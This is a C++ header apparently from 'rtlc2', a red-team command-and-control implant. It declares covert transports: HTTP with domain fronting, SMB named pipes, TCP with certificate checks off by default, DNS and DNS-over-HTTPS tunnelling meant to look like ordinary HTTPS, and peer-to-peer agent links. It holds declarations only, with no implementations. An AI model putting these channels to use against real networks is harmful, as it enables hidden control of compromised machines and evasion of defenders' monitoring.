#ifndef RTLC2_TRANSPORT_H
#define RTLC2_TRANSPORT_H

#include <string>
#include <vector>
#include <map>
#include <cstdint>
#include <functional>

namespace rtlc2 {
namespace transport {

// Transport response
struct Response {
    int status_code;
    std::vector<uint8_t> body;
    std::map<std::string, std::string> headers;
    bool success;
    std::string error;
};

// Abstract transport interface
class Transport {
public:
    virtual ~Transport() = default;
    virtual Response Send(const std::vector<uint8_t>& data) = 0;
    virtual Response Receive() = 0;
    virtual bool Connect() = 0;
    virtual void Disconnect() = 0;
    virtual bool IsConnected() const = 0;
};

// HTTP transport for C2 communication
class HTTPTransport : public Transport {
public:
    HTTPTransport(const std::string& host, int port, bool use_tls, const std::string& user_agent);
    ~HTTPTransport() override;

    Response Send(const std::vector<uint8_t>& data) override;
    Response Receive() override;
    bool Connect() override;
    void Disconnect() override;
    bool IsConnected() const override;

    Response Post(const std::string& path, const std::vector<uint8_t>& data);
    Response Get(const std::string& path);
    void SetHeader(const std::string& key, const std::string& value);
    void SetFrontDomain(const std::string& domain) { front_domain_ = domain; }

private:
    std::string host_;
    int port_;
    bool use_tls_;
    std::string user_agent_;
    std::string base_url_;
    std::map<std::string, std::string> headers_;
    std::string front_domain_;
    bool connected_ = false;

#ifdef RTLC2_WINDOWS
    void* session_;
    bool InitWinHTTP();
    void CleanupWinHTTP();
    Response WinHTTPRequest(const std::string& method, const std::string& path, const std::vector<uint8_t>& data);
#else
    Response CurlRequest(const std::string& method, const std::string& path, const std::vector<uint8_t>& data);
#endif
};

#ifdef RTLC2_WINDOWS

// SMB Named Pipe transport
class SMBTransport : public Transport {
public:
    SMBTransport(const std::string& pipe_name, bool is_server);
    ~SMBTransport() override;

    Response Send(const std::vector<uint8_t>& data) override;
    Response Receive() override;
    bool Connect() override;
    void Disconnect() override;
    bool IsConnected() const override;

private:
    std::string pipe_name_;
    bool is_server_;
    void* pipe_handle_;
    bool connected_ = false;

    bool CreateServer();
    bool ConnectClient();
    bool WritePipe(const std::vector<uint8_t>& data);
    std::vector<uint8_t> ReadPipe();
};

#endif // RTLC2_WINDOWS

// TCP raw transport with optional TLS wrapping
// Supports IPv4/IPv6 dual-stack, 30s send/recv timeouts
class TCPTransport : public Transport {
public:
    TCPTransport(const std::string& host, int port, bool use_tls);
    ~TCPTransport() override;

    Response Send(const std::vector<uint8_t>& data) override;
    Response Receive() override;
    bool Connect() override;
    void Disconnect() override;
    bool IsConnected() const override;

    // Enable/disable TLS certificate verification (default: false for self-signed C2 certs)
    void SetVerifyCert(bool verify) { verify_cert_ = verify; }

private:
    std::string host_;
    int port_;
    bool use_tls_;
    bool verify_cert_ = false;
    int sock_ = -1;
    bool connected_ = false;

    // TLS-aware send/recv helpers
    int SendRaw(const void* buf, int len);
    int RecvRaw(void* buf, int len);

#ifndef RTLC2_WINDOWS
    // OpenSSL TLS context (POSIX builds)
    void* ssl_ = nullptr;      // SSL*
    void* ssl_ctx_ = nullptr;  // SSL_CTX*
#endif
};

// DNS over HTTPS (DoH) transport — tunnels DNS queries through HTTPS
// Traffic appears as regular HTTPS; server DNS listener handles queries unchanged
class DoHTransport : public Transport {
public:
    DoHTransport(const std::string& resolver_url, const std::string& domain,
                 const std::string& dns_server = "", int dns_port = 53);
    ~DoHTransport() override;

    Response Send(const std::vector<uint8_t>& data) override;
    Response Receive() override;
    bool Connect() override;
    void Disconnect() override;
    bool IsConnected() const override;

private:
    std::string resolver_url_;  // e.g. "https://cloudflare-dns.com/dns-query"
    std::string domain_;
    std::string dns_server_;
    int dns_port_;
    bool connected_ = false;
    std::vector<uint8_t> last_response_; // buffered response from last Send

    std::string Base32Encode(const std::vector<uint8_t>& data);
    std::vector<uint8_t> Base32Decode(const std::string& encoded);
    std::vector<uint8_t> BuildDNSQuery(const std::string& subdomain, uint16_t type);
    std::vector<uint8_t> ParseDNSTXTResponse(const std::vector<uint8_t>& response);
};

// DNS transport
class DNSTransport : public Transport {
public:
    DNSTransport(const std::string& domain, const std::string& dns_server, int dns_port = 53);
    ~DNSTransport() override;

    Response Send(const std::vector<uint8_t>& data) override;
    Response Receive() override;
    bool Connect() override;
    void Disconnect() override;
    bool IsConnected() const override;

private:
    std::string domain_;
    std::string dns_server_;
    int dns_port_;
    int sock_ = -1;
    bool connected_ = false;

    std::string Base32Encode(const std::vector<uint8_t>& data);
    std::vector<uint8_t> Base32Decode(const std::string& encoded);
    std::vector<uint8_t> BuildDNSQuery(const std::string& subdomain, uint16_t type);
    std::vector<uint8_t> ParseDNSTXTResponse(const std::vector<uint8_t>& response);
};

// Forward declaration for P2P agent-to-agent transport
// Full implementation in transport/p2p.cpp
class P2PTransport;

} // namespace transport
} // namespace rtlc2

#endif // RTLC2_TRANSPORT_H
